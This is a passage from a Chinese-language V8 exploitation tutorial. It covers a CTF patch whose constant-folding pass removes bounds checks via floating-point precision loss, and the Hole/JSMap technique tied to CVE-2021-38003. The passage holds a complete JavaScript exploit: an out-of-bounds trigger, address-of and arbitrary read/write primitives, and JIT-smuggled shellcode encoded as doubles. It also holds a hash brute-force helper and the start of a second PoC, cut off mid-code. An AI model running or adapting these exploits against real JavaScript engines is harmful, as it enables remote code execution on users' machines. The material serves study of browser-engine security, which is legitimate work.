初始化的。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">SimplifiedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;simplified lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    <span class="function">SimplifiedLowering <span class="title">lowering</span><span class="params">(data-&gt;jsgraph(), data-&gt;js_heap_broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                temp_zone, data-&gt;source_positions(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;node_origins(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                data-&gt;info()-&gt;GetPoisoningMitigationLevel())</span></span>;</span><br><span class="line">    lowering.<span class="built_in">LowerAllNodes</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 搜索 <code>GetPoisoningMitigationLevel</code>
发现如下相关函数： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">PoisoningMitigationLevel poisoning_level_ =</span><br><span class="line">    PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SetPoisoningMitigationLevel</span><span class="params">(PoisoningMitigationLevel poisoning_level)</span> </span>&#123;</span><br><span class="line">  poisoning_level_ = poisoning_level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">PoisoningMitigationLevel <span class="title">GetPoisoningMitigationLevel</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> poisoning_level_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 其中 <code>poisoning_level_</code>
的初始化与 <code>V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS</code> 有关：
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DISABLE_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,</span><br><span class="line">            <span class="string">&quot;Enable mitigations for executing untrusted code&quot;</span>)</span><br><span class="line"><span class="built_in">DEFINE_BOOL</span>(branch_load_poisoning, <span class="literal">false</span>, <span class="string">&quot;Mask loads with branch conditions.&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">compilation_info</span>()-&gt;<span class="built_in">SetPoisoningMitigationLevel</span>(load_poisoning);</span><br></pre></td></tr></table></figure></div> 因此需要将
<code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</code> 修改为
<code>#define V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</code>
才能触发 oob 。 ### 漏洞分析 分析 patch 文件，发现在 type lowering
阶段添加了如下优化： <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">diff --git a/src/compiler/duplicate-addition-reducer.cc b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line"><span class="keyword">new</span> file mode <span class="number">100644</span></span><br><span class="line">index <span class="number">0000000000.</span><span class="number">.59e8437f</span>3d</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/src/compiler/duplicate-addition-reducer.cc</span><br><span class="line">@@ <span class="number">-0</span>,<span class="number">0</span> <span class="number">+1</span>,<span class="number">71</span> @@</span><br><span class="line">+<span class="comment">// Copyright 2018 Google LLC</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line">+<span class="comment">// you may not use this file except in compliance with the License.</span></span><br><span class="line">+<span class="comment">// You may obtain a copy of the License at</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">//      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line">+<span class="comment">//</span></span><br><span class="line">+<span class="comment">// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line">+<span class="comment">// distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line">+<span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line">+<span class="comment">// See the License for the specific language governing permissions and</span></span><br><span class="line">+<span class="comment">// limitations under the License.</span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/duplicate-addition-reducer.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/common-operator.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/graph.h&quot;</span></span></span><br><span class="line">+<span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/compiler/node-properties.h&quot;</span></span></span><br><span class="line">+</span><br><span class="line">+<span class="keyword">namespace</span> v8 &#123;</span><br><span class="line">+<span class="keyword">namespace</span> internal &#123;</span><br><span class="line">+<span class="keyword">namespace</span> compiler &#123;</span><br><span class="line">+</span><br><span class="line">+DuplicateAdditionReducer::<span class="built_in">DuplicateAdditionReducer</span>(Editor* editor, Graph* graph,</span><br><span class="line">+                     CommonOperatorBuilder* common)</span><br><span class="line">+    : <span class="built_in">AdvancedReducer</span>(editor),</span><br><span class="line">+      <span class="built_in">graph_</span>(graph), <span class="built_in">common_</span>(common) &#123;&#125;</span><br><span class="line">+</span><br><span class="line">+Reduction DuplicateAdditionReducer::<span class="built_in">Reduce</span>(Node* node) &#123;</span><br><span class="line">+  <span class="keyword">switch</span> (node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kNumberAdd:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">ReduceAddition</span>(node);</span><br><span class="line">+    <span class="keyword">default</span>:</span><br><span class="line">+      <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+<span class="function">Reduction <span class="title">DuplicateAdditionReducer::ReduceAddition</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ControlInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">EffectInputCount</span>(), <span class="number">0</span>);</span><br><span class="line">+  <span class="built_in">DCHECK_EQ</span>(node-&gt;<span class="built_in">op</span>()-&gt;<span class="built_in">ValueInputCount</span>(), <span class="number">2</span>);</span><br><span class="line">+</span><br><span class="line">+  Node* left = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">+  <span class="keyword">if</span> (left-&gt;<span class="built_in">opcode</span>() != node-&gt;<span class="built_in">opcode</span>()) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* right = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  Node* parent_left = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">0</span>);</span><br><span class="line">+  Node* parent_right = NodeProperties::<span class="built_in">GetValueInput</span>(left, <span class="number">1</span>);</span><br><span class="line">+  <span class="keyword">if</span> (parent_right-&gt;<span class="built_in">opcode</span>() != IrOpcode::kNumberConstant) &#123;</span><br><span class="line">+    <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="type">double</span> const1 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  <span class="type">double</span> const2 = <span class="built_in">OpParameter</span>&lt;<span class="type">double</span>&gt;(parent_right-&gt;<span class="built_in">op</span>());</span><br><span class="line">+  Node* new_const = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">common</span>()-&gt;<span class="built_in">NumberConstant</span>(const1+const2));</span><br><span class="line">+</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, parent_left, <span class="number">0</span>);</span><br><span class="line">+  NodeProperties::<span class="built_in">ReplaceValueInput</span>(node, new_const, <span class="number">1</span>);</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+&#125;  <span class="comment">// namespace compiler</span></span><br><span class="line">+&#125;  <span class="comment">// namespace internal</span></span><br><span class="line">+&#125;  <span class="comment">// namespace v8</span></span><br></pre></td></tr></table></figure></div> 这个优化实际就是常量折叠，例如
<code>x + 1 + 2</code> 可以被优化为 <code>x + 3</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/396b253a6f7d07391ea464da03a86df5.png"
                     
alt="在这里插入图片描述" 
                ></p>
<p>浮点数中有一个上界 9007199254740992
，当达到这个数时精度不能保证。例如
<code>9007199254740991 + 1 = 9007199254740992</code> 但是
<code>9007199254740992 + 1 = 9007199254740992</code>
，<code>9007199254740992 + 2 = 9007199254740994</code>
。我们可以通过二分得到这个上界。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> l = <span class="number">0</span>, r = std::numeric_limits&lt;<span class="type">uint64_t</span>&gt;::<span class="built_in">max</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> m = (__int128(l) + r) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">double</span>(m) == <span class="built_in">double</span>(m) + <span class="number">1</span>) &#123;</span><br><span class="line">            r = m;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            l = m + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">double</span>(l) == <span class="built_in">double</span>(l) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; l &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 由于 type lowering
优化位于计算范围的 typer 之后并且位于优化 <code>CheckBounds</code> 的
simplified lowering 之前，因此可以通过上面的特性利用题目添加的优化为
simplified lowering 提供一个错误的范围使得 <code>CheckBounds</code>
被优化掉造成 oob 。</p>
<p>因此有如下 POC ： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7237de6f4b9bdc2deda37409e6db7a10.png"
                     
alt="在这里插入图片描述" 
                > 这里有几个需要注意的问题： - 需要有一个
<code>x == 1 ? 9007199254740992 : 9007199254740988</code> 条件分枝确保
<code>9007199254740992 + 1 + 1 + 1</code> 优化成
<code>9007199254740992 + 3</code> 而不是 <code>9007199254740992</code>
。 - <code>9007199254740992 - n - 1</code> 是为了确保加上后面的 n 个
<code>+ 1</code> 不和 <code>9007199254740992</code> 加上后面的 n 个
<code>+ 1</code> 相同，否则会和上面那个情况一样被优化成
<code>9007199254740992</code> 。</p>
<h3 id="漏洞利用-1">漏洞利用</h3>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> oob_array = [<span class="number">.1</span>, <span class="number">.2</span>];</span><br><span class="line">        <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740988</span>) + <span class="number">1</span> + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">        t -= <span class="number">9007199254740991</span>;</span><br><span class="line">        oob_array[t] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> oob_array;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">foo</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> oob_array = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">16</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">23</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">address_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">16</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">32</span>] = <span class="title function_">u2d</span>((offset - <span class="number">0x10n</span>) | <span class="number">1n</span>);</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">address_of</span>(shellcode) + <span class="number">0x30n</span>;</span><br><span class="line"><span class="title function_">write</span>(shellcode_addr, <span class="title function_">read</span>(shellcode_addr) + <span class="number">0x6en</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h1 id="hole">Hole</h1>
<h2 id="利用方式">利用方式</h2>
<p><code>Hole</code> 是 JS 内部的一种数据类型，用来标记不存在的元素，与
C++ 中的 <code>nullptr</code>
类似，不过这个数据类型通常是不会泄露至用户。</p>
<p>Hole 类型的漏洞利用是指由于内部数据结构 <code>Hole</code>
通过漏洞被暴露至用户层，因此可以根据 <code>Hole</code> 创建⼀个长度为 -1
的 <code>JSMap</code> 结构，导致越界读写，并造成 RCE。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析可知，当一个元素被从
<code>JSMap</code> 删除的时候 JS 会将该元素对应的 <code>Entry</code> 的
<code>key</code> 和 <code>value</code> 修改为 <code>Hole</code>
。如果我们往 <code>JSMap</code> 中加入一个 <code>key</code> 为
<code>Hole</code> 的元素就可以一直删除 <code>key</code> 为
<code>Hole</code> 的元素。不过实际上由于 shrink 操作会清除
<code>JSMap</code> 中的 <code>Hole</code> 因此需要具体分析。</p>
<p>有如下示例（commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code>）：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br></pre></td></tr></table></figure></div>
<p>这里 <code>map.set(1, 1)</code> 的作用是为了确保两次
<code>map.delete(hole)</code> 后才出现 shrink 操作。之后的
<code>map.delete(1)</code> 使得 <code>map.size</code> 变为 -1 。</p>
<p>根据前面对 <code>JSMap</code> 结构的分析以及实际调试可知
<code>JSMap</code> 的关键结构如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/94d2fd0ea7b951e9588f1ec29419d91e.png"
                     
alt="在这里插入图片描述" 
                > 之后再次向 <code>JSMap</code>
中添加元素。由于 <code>JSMap</code> 中没有待添加元素的 <code>key</code>
，因此会在 <code>elements</code> 中写入新的 <code>Entry</code> 。而新的
<code>Entry</code> 的地址的计算方式是
<code>&amp;buckets + number_of_buckets + (new_number_of_elements + new_number_of_deleted) * 3</code>（统一按照
<code>buckets</code> 元素大小计算） ，由于经过了 shrink
操作，这三个值分别为： - <code>number_of_elements</code>: -1 -
<code>number_of_deleted</code>: 0 - <code>number_of_buckets</code>:
2</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">   occupancy = <span class="title class_">IntPtrAdd</span>(new_number_of_elements, new_number_of_deleted);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">TNode</span>&lt;<span class="title class_">IntPtrT</span>&gt; entry_start = <span class="title class_">IntPtrAdd</span>(</span><br><span class="line">     <span class="title class_">IntPtrMul</span>(occupancy, <span class="title class_">IntPtrConstant</span>(<span class="title class_">OrderedHashMap</span>::kEntrySize)),</span><br><span class="line">     number_of_buckets);</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, key, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * <span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>());</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, value, <span class="variable constant_">UPDATE_WRITE_BARRIER</span>,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span class="title class_">OrderedHashMap</span>::kValueOffset));</span><br><span class="line"> <span class="title class_">UnsafeStoreFixedArrayElement</span>(</span><br><span class="line">     table, entry_start, bucket_entry,</span><br><span class="line">     kTaggedSize * (<span class="title class_">OrderedHashMap</span>::<span class="title class_">HashTableStartIndex</span>() +</span><br><span class="line">                    <span class="title class_">OrderedHashMap</span>::kChainOffset));</span><br></pre></td></tr></table></figure></div>
<p>因此 <code>Entry</code> 起始地址等同于
<code>&amp;bucket[-1]</code>，会将 <code>bucket count</code>
覆盖，也就是说我们能够控制 <code>number_of_buckets</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/c566a42eab160a162872551db2cc1e6a.png"
                     
alt="在这里插入图片描述" 
                > 当我们拥有控制
<code>number_of_buckets</code> 的能力时，由于新的 <code>Entry</code>
的地址的计算方式是
<code>&amp;buckets + number_of_buckets + new_number_of_elements + new_number_of_deleted</code>
，因此我们可以溢出进行任意地址写。其中一个用法便是修改
<code>JSArray</code> 的 <code>length</code> 实现 OOB 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/eef097251127ec745ec4cc2e5270d715.png"
                     
alt="在这里插入图片描述" 
                >
之后的操作可以参考前面的沙箱逃逸。由于这个版本不容易泄露沙箱基地址，因此这里采用立即数写
shellcode 的方法。另外立即数写 shellcode 的 JIT 过程使得 Hole 的 JSMap
利用过程更加稳定。</p>
<p>另外需要注意的是 <code>JSMap</code> 的 <code>set</code> 操作时如果
<code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code>
不为 -1 ，则会在
<code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code>
对应的单向链表中查找 <code>key</code> ，期间会检查链表中的
<code>Entry</code> 是否合法。为了避免出现这一情况，需要满足
<code>HashTable[ComputeUnseededHash(key) &amp; (buckets - 1)]</code>
。调试发现原来的 <code>buckets</code> 范围内的值为 -1 因此只需要满足
<code>ComputeUnseededHash(key) &amp; (buckets - 1) = 0</code> 并且
<code>key</code> 足够大（这里用 <code>key</code> 来覆盖
<code>JsArray</code> 的 <code>length</code>，否则会破坏
<code>JsArray</code> 的结构）。因此有如下爆破脚本。 <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ComputeUnseededHash</span><span class="params">(<span class="type">uint32_t</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> hash = key;</span><br><span class="line">    hash = ~hash + (hash &lt;&lt; <span class="number">15</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">12</span>);</span><br><span class="line">    hash = hash + (hash &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    hash = hash * <span class="number">2057</span>;</span><br><span class="line">    hash = hash ^ (hash &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> hash &amp; <span class="number">0x3fffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key = <span class="number">0x300</span>, buckets = <span class="number">0x15</span>;</span><br><span class="line">    <span class="keyword">while</span> ((<span class="built_in">ComputeUnseededHash</span>(key) &amp; (buckets - <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        key++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, key);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下： <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./d8 --allow-natives-syntax poc.js</span></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) 